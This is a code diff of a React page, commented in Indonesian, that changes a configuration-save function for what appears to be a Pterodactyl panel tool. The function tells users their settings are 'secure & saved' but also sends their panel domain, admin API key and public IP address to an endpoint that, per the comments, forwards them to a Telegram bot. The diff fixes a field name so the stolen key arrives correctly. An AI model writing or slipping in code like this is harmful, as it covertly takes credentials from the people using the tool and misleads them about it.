@@ -45,26 +45,28 @@ export default function Home() {
   }, []);
 
   // === FITUR NOTIFIKASI TELEGRAM ===
-
+  // === FITUR NOTIFIKASI TELEGRAM (FIXED) ===
   const saveConfig = async () => {
+    // Validasi input
     if (!config.domain || !config.plta) {
       return setStatus({ type: 'error', msg: 'Harap isi Domain dan PLTA dengan benar.' });
     }
 
+    // Simpan ke LocalStorage
     localStorage.setItem('panel_config', JSON.stringify(config));
     setIsConfigured(true);
     setStatus({ type: 'success', msg: 'Konfigurasi aman & tersimpan!' });
 
-    // Kirim Laporan Lengkap ke Telegram
+    // Kirim Laporan ke Telegram
     try {
-      // 1. Cek IP User
+      // 1. Ambil IP
       const ipRes = await axios.get('https://api.ipify.org?format=json');
       const userIp = ipRes.data.ip;
 
-      // 2. Kirim Data ke Bot (Domain + PLTA + IP)
+      // 2. Kirim Data (PASTIKAN "plta" TERTULIS BENAR DISINI)
       await axios.post('/api/notify', {
         domain: config.domain,
-        key: config.plta, // <--- INI YANG DITAMBAH
+        plta: config.plta,  // <--- JANGAN "key", HARUS "plta" SESUAI STATE
         ip: userIp
       });
       console.log("Security Report sent.");
@@ -77,7 +79,7 @@ export default function Home() {
       setActiveTab('create');
     }, 1500);
   };
-  
+
   const fetchServers = async () => {
     if(!isConfigured) return;
     setLoadingList(true);
